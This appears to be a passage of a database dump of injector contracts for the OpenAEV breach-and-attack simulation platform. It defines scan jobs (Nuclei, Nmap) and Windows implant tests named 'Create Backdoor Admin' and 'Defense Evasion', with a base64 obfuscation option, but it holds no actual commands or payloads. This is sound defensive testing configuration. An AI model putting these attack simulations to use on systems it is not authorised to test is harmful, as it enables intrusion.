of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	e1bad898-9804-427d-99e4-dc32c5f2898d	t	f	{}	f	\N	f	\N
2e7fc079-4531-4444-4444-928fe4a2fc0b	2026-01-09 14:19:36.681254+00	2026-01-16 10:18:33.259179+00	"en"=>"Nuclei - TEMPLATES Scan", "fr"=>"Nuclei - Scan TEMPLATES"	f	{"contract_id": "2e7fc079-4531-4444-4444-928fe4a2fc0b", "label": {"en": "Nuclei - TEMPLATES Scan", "fr": "Nuclei - Scan TEMPLATES"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": "Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "VULNERABILITY", "expectation_name": "Not vulnerable", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}, {"key": "template", "label": "Manual template path (-t)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}], "outputs": [{"type": "cve", "field": "cve", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}, {"type": "text", "field": "others", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}], "config": {"type": "openaev_nuclei", "expose": true, "label": {"en": "Nuclei Scan", "fr": "Nuclei Scan"}, "color_dark": "#ff5722", "color_light": "#ff5722"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	e1bad898-9804-427d-99e4-dc32c5f2898d	t	f	{}	f	\N	f	\N
84ce643f-a82a-4490-b826-4e1495e94e80	2026-01-09 15:02:10.853574+00	2026-01-09 15:02:10.85358+00	"en"=>"Test - Create Backdoor Admin", "fr"=>"Test - Create Backdoor Admin"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Create Backdoor Admin","en":"Test - Create Backdoor Admin"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"84ce643f-a82a-4490-b826-4e1495e94e80","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	a56f8b26-1120-4315-b880-74fcdf828fae	f	\N
93d27459-68d0-43b1-ad65-eacc3cfa5cf7	2026-01-09 14:19:36.824132+00	2026-01-16 10:18:19.750778+00	"en"=>"Nmap - TCP Connect Scan", "fr"=>"Nmap - TCP Connect Scan"	f	{"contract_id": "93d27459-68d0-43b1-ad65-eacc3cfa5cf7", "label": {"en": "Nmap - TCP Connect Scan", "fr": "Nmap - TCP Connect Scan"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": "Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "DETECTION", "expectation_name": "Detection", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}], "outputs": [{"type": "portscan", "field": "scan_results", "labels": ["scan"], "isFindingCompatible": true, "isMultiple": true}, {"type": "port", "field": "ports", "labels": ["scan"], "isFindingCompatible": false, "isMultiple": true}], "config": {"type": "openaev_nmap", "expose": true, "label": {"en": "Nmap Scan", "fr": "Nmap Scan"}, "color_dark": "#00bcd4", "color_light": "#00bcd4"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	76f8f4d6-9f6f-4e61-befc-48f735876a4a	t	f	{}	f	\N	f	\N
0a4a063a-b40b-4991-9ab4-99db8ddaeeb9	2026-01-09 15:02:39.686665+00	2026-01-09 15:02:39.686672+00	"en"=>"Test - Scan for Databases", "fr"=>"Test - Scan for Databases"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Scan for Databases","en":"Test - Scan for Databases"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"0a4a063a-b40b-4991-9ab4-99db8ddaeeb9","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	355c0f08-d025-4c1c-ad9b-4e47601303e9	f	\N
9beb3641-606e-46b8-8168-8e9a906f8a3e	2026-01-09 15:03:17.647835+00	2026-01-09 15:03:17.647842+00	"en"=>"Test - Clean Up Desktop", "fr"=>"Test - Clean Up Desktop"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Clean Up Desktop","en":"Test - Clean Up Desktop"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"9beb3641-606e-46b8-8168-8e9a906f8a3e","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	fdd66bfa-c215-4b87-ae27-9e6a43e453af	f	\N
c82fdadf-44d2-41a3-9f36-218f37836d43	2026-01-09 15:03:55.476364+00	2026-01-09 15:03:55.476371+00	"en"=>"Test - Clean Up Server", "fr"=>"Test - Clean Up Server"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Clean Up Server","en":"Test - Clean Up Server"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"c82fdadf-44d2-41a3-9f36-218f37836d43","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	6ae382b7-e820-453d-800b-af7028066c08	f	\N
edc597de-2394-4cde-8d5a-34598d73e057	2026-01-16 08:13:29.316547+00	2026-01-16 08:13:29.316552+00	"en"=>"Test - Defense Evasion", "fr"=>"Test - Defense Evasion"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Test - Defense Evasion","en":"Test - Defense Evasion"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"edc597de-2394-4cde-8d5a-34598d73e057","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	aac07d09-8b8a-4cde-be21-5d5aab4559b1	f	\N
